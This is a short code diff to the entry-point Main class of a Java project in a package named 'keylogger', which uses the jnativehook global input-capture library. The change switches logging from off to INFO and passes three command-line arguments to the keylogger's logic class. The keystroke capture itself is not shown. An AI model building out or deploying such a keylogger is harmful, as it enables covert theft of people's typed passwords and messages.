@@ -1,15 +1,16 @@
 package com.mossad.keylogger;
 
 import com.mossad.keylogger.logic.LogicFlow;
+import org.jnativehook.NativeHookException;
+
 import java.util.logging.Level;
 import java.util.logging.Logger;
-import org.jnativehook.NativeHookException;
 
 public class Main {
 
     public static void main(String[] args) throws NativeHookException {
-        Logger.getGlobal().setLevel(Level.OFF);
-        LogicFlow logicFlow = new LogicFlow();
+        Logger.getGlobal().setLevel(Level.INFO);
+        LogicFlow logicFlow = new LogicFlow(args[0], args[1], args[2]);
         logicFlow.execute();
     }
 
